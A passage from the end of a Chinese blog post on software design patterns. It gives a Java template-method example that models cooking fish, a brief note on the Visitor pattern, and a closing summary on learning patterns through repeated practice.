<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 抽象类，没定下来的操作作为抽象方法</span></span><br><span class="line"><span class="keyword">abstract</span> DoFish&#123;</span><br><span class="line">	<span class="keyword">void</span> <span class="title function_">operation</span><span class="params">()</span>&#123;</span><br><span class="line">		<span class="comment">// 放油</span></span><br><span class="line">		putOil();</span><br><span class="line">		</span><br><span class="line">		<span class="comment">// 放鱼</span></span><br><span class="line">		putFish();</span><br><span class="line">		</span><br><span class="line">		<span class="comment">// 放水</span></span><br><span class="line">		putWater();</span><br><span class="line">		</span><br><span class="line">		<span class="comment">// 放调料</span></span><br><span class="line">		putFlavour();</span><br><span class="line">	&#125;	</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title function_">putOil</span><span class="params">()</span>;</span><br><span class="line">	<span class="keyword">void</span> <span class="title function_">putFish</span><span class="params">()</span>&#123;</span><br><span class="line">		<span class="comment">// ...</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title function_">putWater</span><span class="params">()</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title function_">putFlavour</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 一种具体的做法</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">OneDoFish</span> <span class="keyword">extends</span> <span class="title class_">DoFish</span>()&#123;</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="keyword">void</span> <span class="title function_">putOil</span><span class="params">()</span>&#123;&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="keyword">void</span> <span class="title function_">putWater</span><span class="params">()</span>&#123;&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="keyword">void</span> <span class="title function_">putFlavour</span><span class="params">()</span>&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>客户端</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">DoFish o=<span class="keyword">new</span> <span class="title class_">OneDoFish</span>();</span><br><span class="line">o.operation();</span><br></pre></td></tr></table></figure>

<h2 id="11-访问者（Visitor）"><a href="#11-访问者（Visitor）" class="headerlink" title="11. 访问者（Visitor）"></a>11. 访问者（Visitor）</h2><p>这应该是23中模式中最复杂的一种了，但是和桥接模式一样，可以从中受到很大的启发。</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>现有的这23种模式已经介绍完了， 我们应该注重体会各个设计模式的使用场景以及设计初衷，然后在适当的地方使用它们，做到物尽其用。</p>
<p>虽然这里介绍的是代码的设计模式，但其实我们应该站在宏观的角度看___设计模式___这个词。宏观来看，我们在生活和工作中___反复实践___总结出的经验都可以是设计模式，这里强调了___反复实践___，在实际应用场景中反复实践求证，这样出来的经验总结才能称作是设计模式，指导我们做好我们要做的事情。</p>
]]></content>
      <categories>
        <category>technology</category>
      </categories>
      <tags>
        <tag>设计模式</tag>
        <tag>编程思想</tag>
      </tags>
  </entry>
</search>
